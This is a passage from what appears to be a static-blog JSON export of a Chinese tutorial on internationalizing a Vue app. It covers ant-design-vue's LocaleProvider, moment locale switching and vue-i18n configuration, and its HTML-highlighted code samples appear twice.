class=\"headerlink\" title=\"概述\"></a>概述</h1><p>国际化，包括组件库的国际化、第三库的国际化和本地业务的国际化。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a><br>测试示例效果图：<br><img src=\"/vue-in-action-i18n/overview.jpg\" alt=\"overview\"></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"组件库的国际化\"><a href=\"#组件库的国际化\" class=\"headerlink\" title=\"组件库的国际化\"></a>组件库的国际化</h2><p>以 ant-design-vue 库为例，针对国际化提供了 LocaleProvider 组件，具体使用如下：</p>\n<h3 id=\"全局注册组件\"><a href=\"#全局注册组件\" class=\"headerlink\" title=\"全局注册组件\"></a>全局注册组件</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; LocaleProvider &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"ant-design-vue\"</span>;</span><br><span class=\"line\">Vue.use(LocaleProvider);</span><br></pre></td></tr></table></figure>\n<h3 id=\"App-vue-中使用\"><a href=\"#App-vue-中使用\" class=\"headerlink\" title=\"App.vue 中使用\"></a>App.vue 中使用</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"app\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a-locale-provider</span> <span class=\"attr\">:locale</span>=<span class=\"string\">\"locale\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">router-view</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">a-locale-provider</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> zh_CN <span class=\"keyword\">from</span> <span class=\"string\">\"ant-design-vue/lib/locale-provider/zh_CN\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> en_US <span class=\"keyword\">from</span> <span class=\"string\">\"ant-design-vue/lib/locale-provider/en_US\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    data() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        locale: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          type: <span class=\"built_in\">Object</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">default</span>: en_US</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    watch: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"string\">\"$route.query.locale\"</span>: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">val</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">this</span>.locale = val === <span class=\"string\">\"en_US\"</span> ? en_US : zh_CN;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>对于 locale 值的动态获取，本示例是通过路由的 query 实现的。例如本示例：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a-layout-header</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background: #fff; padding: 0\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a-dropdown</span> <span class=\"attr\">style</span>=<span class=\"string\">\"float:right;margin-right:30px;\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"ant-dropdown-link\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"javascript:void(0)\"</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">a-icon</span> <span class=\"attr\">type</span>=<span class=\"string\">\"global\"</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a-menu</span> <span class=\"attr\">slot</span>=<span class=\"string\">\"overlay\"</span> @<span class=\"attr\">click</span>=<span class=\"string\">\"onClick\"</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">a-menu-item</span> <span class=\"attr\">key</span>=<span class=\"string\">\"zh_CN\"</span>&gt;</span>中文<span class=\"tag\">&lt;/<span class=\"name\">a-menu-item</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">a-menu-item</span> <span class=\"attr\">key</span>=<span class=\"string\">\"en_US\"</span>&gt;</span>English<span class=\"tag\">&lt;/<span class=\"name\">a-menu-item</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">a-menu</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">a-dropdown</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">a-layout-header</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    methods: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      onClick(&#123; key &#125;) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">this</span>.$router.push(&#123; <span class=\"attr\">query</span>: &#123; <span class=\"attr\">locale</span>: key &#125; &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">scoped</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>组件库国际化完成后，测试效果图：<br><img src=\"/vue-in-action-i18n/1.jpg\" alt=\"效果图\"></p>\n<p>我们发现日期选择组件中并没有完全国际化，原因就是组件库引用了第三方的 moment 库，而 moment 库有自己的国际化方式，说明见下面“第三方库的国际化”。</p>\n<h2 id=\"第三方库的国际化\"><a href=\"#第三方库的国际化\" class=\"headerlink\" title=\"第三方库的国际化\"></a>第三方库的国际化</h2><p>针对<code>moment</code>库的国际化，在上段代码基础上修改如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- src/App.vue --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> zh_CN <span class=\"keyword\">from</span> <span class=\"string\">\"ant-design-vue/lib/locale-provider/zh_CN\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> en_US <span class=\"keyword\">from</span> <span class=\"string\">\"ant-design-vue/lib/locale-provider/en_US\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> moment <span class=\"keyword\">from</span> <span class=\"string\">\"moment\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> <span class=\"string\">\"moment/locale/zh-cn\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    data() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        locale: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          type: <span class=\"built_in\">Object</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">default</span>: en_US</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    watch: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"string\">\"$route.query.locale\"</span>: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">val</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">this</span>.locale = val === <span class=\"string\">\"en_US\"</span> ? en_US : zh_CN;</span></span><br><span class=\"line\"><span class=\"javascript\">        moment.locale(val === <span class=\"string\">\"en_US\"</span> ? <span class=\"string\">\"en\"</span> : <span class=\"string\">\"zh-cn\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"本地业务的国际化\"><a href=\"#本地业务的国际化\" class=\"headerlink\" title=\"本地业务的国际化\"></a>本地业务的国际化</h2><p>推荐用<a href=\"https://kazupon.github.io/vue-i18n/\" target=\"_blank\" rel=\"noopener\">Vue I18n</a>，本次也以该插件为例。</p>\n<p>例如上面的效果图，日期选择组件有个 label 的文案“time”，我们对它进行国际化。</p>\n<p>首先，本地创建国际化文件，例如：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/local/zhCN.js</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  <span class=\"string\">\"app.dashboard.analysis.timeLabel\"</span>: <span class=\"string\">\"时间\"</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/local/enUS.js</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  <span class=\"string\">\"app.dashboard.analysis.timeLabel\"</span>: <span class=\"string\">\"Time\"</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>然后，安装相关包文件：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> query-string 是方便解析URL查询字符串</span></span><br><span class=\"line\">npm install vue-i18n query-string -S</span><br></pre></td></tr></table></figure>\n<p>再然后，在 main.js 中进行注册配置：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 引入相关包</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> VueI18n <span class=\"keyword\">from</span> <span class=\"string\">\"vue-i18n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> enUS <span class=\"keyword\">from</span> <span class=\"string\">\"./locale/enUS\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> zhCN <span class=\"keyword\">from</span> <span class=\"string\">\"./locale/zhCN\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> queryString <span class=\"keyword\">from</span> <span class=\"string\">\"query-string\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 注册组件</span></span><br><span class=\"line\">Vue.use(VueI18n);</span><br><span class=\"line\"><span class=\"comment\">// 创建一个实例</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> i18n = <span class=\"keyword\">new</span> VueI18n(&#123;</span><br><span class=\"line\">  locale: queryString.parse(location.search).locale || <span class=\"string\">\"zh_CN\"</span>,</span><br><span class=\"line\">  messages: &#123;</span><br><span class=\"line\">    zh_CN: &#123; <span class=\"attr\">message</span>: zhCN &#125;,</span><br><span class=\"line\">    en_US: &#123; <span class=\"attr\">message</span>: enUS &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">// 挂载到Vue实例</span></span><br><span class=\"line\"><span class=\"keyword\">new</span> Vue(&#123;</span><br><span class=\"line\">  i18n,</span><br><span class=\"line\">  router,</span><br><span class=\"line\">  store,</span><br><span class=\"line\">  render: <span class=\"function\"><span class=\"params\">h</span> =&gt;</span> h(App)</span><br><span class=\"line\">&#125;).$mount(<span class=\"string\">\"#app\"</span>);</span><br></pre></td></tr></table></figure>\n<p>最后，在切换语言的地方，添加动态修改 locale：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">onClick(&#123; key &#125;) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.$router.push(&#123;<span class=\"attr\">query</span>: &#123;<span class=\"attr\">locale</span>: key&#125;&#125;);</span><br><span class=\"line\">  <span class=\"comment\">// 动态修改locale</span></span><br><span class=\"line\">  <span class=\"keyword\">this</span>.$i18n.locale = key;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最终效果：<br><img src=\"/vue-in-action-i18n/2.jpg\" alt=\"效果图\"></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>国际化，包括组件库的国际化、第三库的国际化和本地业务的国际化。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a><br>测试示例效果图：<br><img src=\"/vue-in-action-i18n/overview.jpg\" alt=\"overview\"></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"组件库的国际化\"><a href=\"#组件库的国际化\" class=\"headerlink\" title=\"组件库的国际化\"></a>组件库的国际化</h2><p>以 ant-design-vue 库为例，针对国际化提供了 LocaleProvider 组件，具体使用如下：</p>\n<h3 id=\"全局注册组件\"><a href=\"#全局注册组件\" class=\"headerlink\" title=\"全局注册组件\"></a>全局注册组件</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; LocaleProvider &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"ant-design-vue\"</span>;</span><br><span class=\"line\">Vue.use(LocaleProvider);</span><br></pre></td></tr></table></figure>\n<h3 id=\"App-vue-中使用\"><a href=\"#App-vue-中使用\" class=\"headerlink\" title=\"App.vue 中使用\"></a>App.vue 中使用</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"app\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a-locale-provider</span> <span class=\"attr\">:locale</span>=<span class=\"string\">\"locale\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">router-view</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">a-locale-provider</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> zh_CN <span class=\"keyword\">from</span> <span class=\"string\">\"ant-design-vue/lib/locale-provider/zh_CN\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> en_US <span class=\"keyword\">from</span> <span class=\"string\">\"ant-design-vue/lib/locale-provider/en_US\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    data() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        locale: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          type: <span class=\"built_in\">Object</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">default</span>: en_US</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    watch: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"string\">\"$route.query.locale\"</span>: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">val</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">this</span>.locale = val === <span class=\"string\">\"en_US\"</span> ? en_US : zh_CN;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>对于 locale 值的动态获取，本示例是通过路由的 query 实现的。例如本示例：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a-layout-header</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background: #fff; padding: 0\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a-dropdown</span> <span class=\"attr\">style</span>=<span class=\"string\">\"float:right;margin-right:30px;\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"ant-dropdown-link\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"javascript:void(0)\"</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">a-icon</span> <span class=\"attr\">type</span>=<span class=\"string\">\"global\"</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a-menu</span> <span class=\"attr\">slot</span>=<span class=\"string\">\"overlay\"</span> @<span class=\"attr\">click</span>=<span class=\"string\">\"onClick\"</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">a-menu-item</span> <span class=\"attr\">key</span>=<span class=\"string\">\"zh_CN\"</span>&gt;</span>中文<span class=\"tag\">&lt;/<span class=\"name\">a-menu-item</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">a-menu-item</span> <span class=\"attr\">key</span>=<span class=\"string\">\"en_US\"</span>&gt;</span>English<span class=\"tag\">&lt;/<span class=\"name\">a-menu-item</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">a-menu</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">a-dropdown</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">a-layout-header</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    methods: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      onClick(&#123; key &#125;) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">this</span>.$router.push(&#123; <span class=\"attr\">query</span>: &#123; <span class=\"attr\">locale</span>: key &#125; &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">scoped</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>组件库国际化完成后，测试效果图：<br><img src=\"/vue-in-action-i18n/1.jpg\" alt=\"效果图\"></p>\n<p>我们发现日期选择组件中并没有完全国际化，原因就是组件库引用了第三方的 moment 库，而 moment 库有自己的国际化方式，说明见下面“第三方库的国际化”。</p>\n<h2 id=\"第三方库的国际化\"><a href=\"#第三方库的国际化\" class=\"headerlink\" title=\"第三方库的国际化\"></a>第三方库的国际化</h2><p>针对<code>moment</code>库的国际化，在上段代码基础上修改如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span 